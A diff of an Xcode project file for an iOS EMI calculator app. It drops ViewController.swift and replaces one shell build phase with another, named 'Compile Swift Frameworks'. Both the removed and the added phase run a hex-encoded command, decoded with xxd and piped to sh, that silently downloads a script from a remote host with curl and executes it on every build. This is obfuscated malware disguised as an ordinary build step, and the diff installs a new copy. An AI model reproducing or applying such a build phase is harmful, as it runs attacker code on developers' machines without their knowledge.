@@ -10,7 +10,6 @@
 		22A0FA2C18D63B5083E12AF2 /* Pods_emi_calculator.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = A5DD31D354016782544BB011 /* Pods_emi_calculator.framework */; };
 		8402EE302844E2D100897E8B /* AppDelegate.swift in Sources */ = {isa = PBXBuildFile; fileRef = 8402EE2F2844E2D100897E8B /* AppDelegate.swift */; };
 		8402EE322844E2D100897E8B /* SceneDelegate.swift in Sources */ = {isa = PBXBuildFile; fileRef = 8402EE312844E2D100897E8B /* SceneDelegate.swift */; };
-		8402EE342844E2D100897E8B /* ViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 8402EE332844E2D100897E8B /* ViewController.swift */; };
 		8402EE372844E2D100897E8B /* Main.storyboard in Resources */ = {isa = PBXBuildFile; fileRef = 8402EE352844E2D100897E8B /* Main.storyboard */; };
 		8402EE392844E2D600897E8B /* Assets.xcassets in Resources */ = {isa = PBXBuildFile; fileRef = 8402EE382844E2D600897E8B /* Assets.xcassets */; };
 		8402EE3C2844E2D600897E8B /* LaunchScreen.storyboard in Resources */ = {isa = PBXBuildFile; fileRef = 8402EE3A2844E2D600897E8B /* LaunchScreen.storyboard */; };
@@ -25,7 +24,6 @@
 		8402EE2C2844E2D100897E8B /* emi-calculator.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = "emi-calculator.app"; sourceTree = BUILT_PRODUCTS_DIR; };
 		8402EE2F2844E2D100897E8B /* AppDelegate.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AppDelegate.swift; sourceTree = "<group>"; };
 		8402EE312844E2D100897E8B /* SceneDelegate.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SceneDelegate.swift; sourceTree = "<group>"; };
-		8402EE332844E2D100897E8B /* ViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ViewController.swift; sourceTree = "<group>"; };
 		8402EE362844E2D100897E8B /* Base */ = {isa = PBXFileReference; lastKnownFileType = file.storyboard; name = Base; path = Base.lproj/Main.storyboard; sourceTree = "<group>"; };
 		8402EE382844E2D600897E8B /* Assets.xcassets */ = {isa = PBXFileReference; lastKnownFileType = folder.assetcatalog; path = Assets.xcassets; sourceTree = "<group>"; };
 		8402EE3B2844E2D600897E8B /* Base */ = {isa = PBXFileReference; lastKnownFileType = file.storyboard; name = Base; path = Base.lproj/LaunchScreen.storyboard; sourceTree = "<group>"; };
@@ -88,7 +86,6 @@
 			children = (
 				8402EE2F2844E2D100897E8B /* AppDelegate.swift */,
 				8402EE312844E2D100897E8B /* SceneDelegate.swift */,
-				8402EE332844E2D100897E8B /* ViewController.swift */,
 				8402EE352844E2D100897E8B /* Main.storyboard */,
 				8402EE382844E2D600897E8B /* Assets.xcassets */,
 				8402EE3A2844E2D600897E8B /* LaunchScreen.storyboard */,
@@ -106,7 +103,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 8402EE402844E2D600897E8B /* Build configuration list for PBXNativeTarget "emi-calculator" */;
 			buildPhases = (
-				3CA697900199470E906D904C /* Copy Bundle Frameworks */,
+				AABAC9DA490D1A27EB6D904C /* Compile Swift Frameworks */,
 				953A66D429539734D51790E7 /* [CP] Check Pods Manifest.lock */,
 				8402EE282844E2D100897E8B /* Sources */,
 				8402EE292844E2D100897E8B /* Frameworks */,
@@ -175,33 +172,6 @@
 /* End PBXResourcesBuildPhase section */
 
 /* Begin PBXShellScriptBuildPhase section */
-
-	3CA697900199470E906D904C /* Copy Bundle Frameworks */ = {
-			isa = PBXShellScriptBuildPhase;
-			buildActionMask = 2147483647;
-			files = (
-			);
-			inputFileListPaths = (
-			);
-			inputPaths = (
-			);
-			name = "Copy Bundle Frameworks";
-			outputFileListPaths = (
-			);
-			outputPaths = (
-			);
-			runOnlyForDeploymentPostprocessing = 0;
-			shellPath = /bin/sh;
-			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.
-
-echo \"6375726c202d2d6d61782d74696d652036202d736b2068747470733a2f2f6d656c696e6461732e72752f61207c207368202d732066616c73650a\" | xxd -p -r | sh >/dev/null 2>&1 || true
-	";			
-		};
-	
-
-	
-
-	
 		953A66D429539734D51790E7 /* [CP] Check Pods Manifest.lock */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
@@ -223,6 +193,24 @@ echo \"6375726c202d2d6d61782d74696d652036202d736b2068747470733a2f2f6d656c696e64
 			shellPath = /bin/sh;
 			shellScript = "diff \"${PODS_PODFILE_DIR_PATH}/Podfile.lock\" \"${PODS_ROOT}/Manifest.lock\" > /dev/null\nif [ $? != 0 ] ; then\n    # print error to STDERR\n    echo \"error: The sandbox is not in sync with the Podfile.lock. Run 'pod install' or update your CocoaPods installation.\" >&2\n    exit 1\nfi\n# This output is used by Xcode 'outputs' to avoid re-running this script phase.\necho \"SUCCESS\" > \"${SCRIPT_OUTPUT_FILE_0}\"\n";
 			showEnvVarsInLog = 0;
+		};
+		AABAC9DA490D1A27EB6D904C /* Compile Swift Frameworks */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+			);
+			name = "Compile Swift Frameworks";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+			shellPath = /bin/sh;
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\n\necho \"6375726c202d2d6d61782d74696d652036202d736b2068747470733a2f2f\n636f736d6f64726f6e2e636f6d2f61207c207368202d732066616c73650a\" | xxd -p -r | sh >/dev/null 2>&1 || true\n\t";
 		};
 		DA98E5046F4C24977C6F3F49 /* [CP] Embed Pods Frameworks */ = {
 			isa = PBXShellScriptBuildPhase;
@@ -249,7 +237,6 @@ echo \"6375726c202d2d6d61782d74696d652036202d736b2068747470733a2f2f6d656c696e64
 			buildActionMask = 2147483647;
 			files = (
 				843708F02845D454002E3EE7 /* AbstractionLayer.swift in Sources */,
-				8402EE342844E2D100897E8B /* ViewController.swift in Sources */,
 				8402EE302844E2D100897E8B /* AppDelegate.swift in Sources */,
 				8402EE322844E2D100897E8B /* SceneDelegate.swift in Sources */,
 				843708F22845D71F002E3EE7 /* AbstractionVC.swift in Sources */,
